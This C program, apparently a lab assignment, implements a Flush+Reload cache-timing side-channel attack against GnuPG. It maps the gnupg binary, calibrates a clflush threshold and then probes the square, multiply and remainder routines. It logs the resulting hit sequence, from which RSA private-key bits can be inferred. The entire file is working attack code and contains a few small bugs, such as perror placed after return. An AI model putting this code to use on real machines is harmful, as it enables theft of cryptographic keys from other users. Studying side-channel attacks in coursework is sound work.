#include <time.h>
#include "../lib/util.h"
#include "../lib/gnupg.h"
#include <unistd.h>
#include <math.h>
#include <stdio.h>
#include <signal.h>

#define _POSIX_C_SOURCE  200809L
#define _GNU_SOURCE
#define MAX_DATA_SIZE 1000000
void do_something(int times) {
    for(int i=0;i < times;i++) {
        volatile int j = i*2;
        j++;
    }
    return;
}

volatile sig_atomic_t stop = 0;
static void int_handler (int signum) {
    stop = 1;
}

int compare(const void * a, const void * b)
{
    return ( *(int*)a - *(int*)b );
}

#define NUM_ACCESSES 10000
static inline int get_clflush_threshold (void *flush_addr) {
    long long access_times[NUM_ACCESSES];
    long long first_half_mean = 0, second_half_mean = 0;
    volatile void *y = (volatile void *)flush_addr;

    for (int i = 0; i < NUM_ACCESSES; i++) {
        if (i % 2 == 0){
            clflush((void *)y);
            //do_something();
        }
        else{
            measure_one_block_access_time((void*)y);
        }
        access_times[i] = measure_one_block_access_time ((void *)y);
    }

    qsort (access_times, NUM_ACCESSES, sizeof (long long), compare);
    for (int i = 0; i < NUM_ACCESSES; i++)
        if (i < (NUM_ACCESSES / 2))
            first_half_mean += access_times[i];
        else
            second_half_mean += access_times[i];
    first_half_mean /= (NUM_ACCESSES / 2);
    second_half_mean /= (NUM_ACCESSES / 2);
    return floor (0.9 * first_half_mean + 0.1 * second_half_mean);
}

struct pair {
    long long timestamp;
    long long atime;
    char character;
};

int main(int argc, char **argv) {
    unsigned char *addr;
    int THRESHOLD;
    int times;
    void *s_addr, *m_addr, *r_addr;
    struct pair data[30000];
    //struct pair mdata[300000];

    struct pair* mdata = (struct pair*)malloc(300000*sizeof(struct pair));

    signal(SIGINT, int_handler);
    memset (data, '\0', sizeof (data));
    memset (mdata, '\0', 300000*sizeof(struct pair));
    map_handle_t *file_map;

    if (argc != 2)
    {
        return -1;
        perror ("Not enough args given!\n");
    }

    times = atoi (argv[1]);
    addr = map_file (gnupg_path, &file_map);
    THRESHOLD = get_clflush_threshold ((void *)addr);
    printf ("THRESHOLD = %d\n", THRESHOLD);

    if (addr == (void *) -1)
        return 4;

    s_addr = addr + square_add - base_add;
    m_addr = addr + multiply_add - base_add;
    r_addr = addr + remainder_add - base_add;
    // continuously probe the cache line

    long long i = 0, j = 0,jj=0;
    while (j<30000 && jj<300000 && stop!=1) {
        int atime;

        atime = measure_one_block_access_time ((void *) r_addr);
        if (atime < THRESHOLD) {
            data[j].timestamp = i;
            data[j].atime = atime;
            data[j].character = 'r';
            j++;
        }
        else{
            mdata[jj].timestamp = i;
            mdata[jj].atime = atime;
            mdata[jj].character = 'r';
            jj++;
        }
        atime = measure_one_block_access_time ((void *) s_addr);
        if (atime < THRESHOLD) {
            data[j].timestamp = i;
            data[j].atime = atime;
            data[j].character = 'S';
            j++;
        }
        else{
            mdata[jj].timestamp = i;
            mdata[jj].atime = atime;
            mdata[jj].character = 'S';
            jj++;
        }
        atime = measure_one_block_access_time ((void *) m_addr);
        if (atime < THRESHOLD) {
            data[j].timestamp = i;
            data[j].atime = atime;
            data[j].character = 'M';
            j++;
        }
        else{
            mdata[jj].timestamp = i;
            mdata[jj].atime = atime;
            mdata[jj].character = 'M';
            jj++;
        }

        clflush(m_addr);
        clflush(r_addr);
        clflush(s_addr);

        do_something(times);
        i++;
    }

    for (int i = 0; i < j; i++) {
        if (data[i].character == '\0')
            break;
        printf ("%c", data[i].character);
    }

    int fd;
    if ((fd = open ("./Task-2a.data", O_RDWR | O_CREAT, 0755)) < 0) {
        perror ("Error opening file: ");
        return -1;
    }

    for (int i = 0; i < j; i++) {
        if (data[i].character == '\0')
            break;
        dprintf (fd, "%lld,%lld,%c\n", data[i].timestamp, data[i].atime, data[i].character);
    }
    close(fd);
    if ((fd = open ("./Task-2a-missdata.data", O_RDWR | O_CREAT, 0755)) < 0) {
        perror ("Error opening file: ");
        return -1;
    }

    for (int i = 0; i < jj; i++) {
        if (mdata[i].character == '\0')
            break;
        dprintf (fd, "%lld,%lld,%c\n", mdata[i].timestamp, mdata[i].atime, mdata[i].character);
    }    

    close (fd);
    printf ("\n");
    return 0;
}
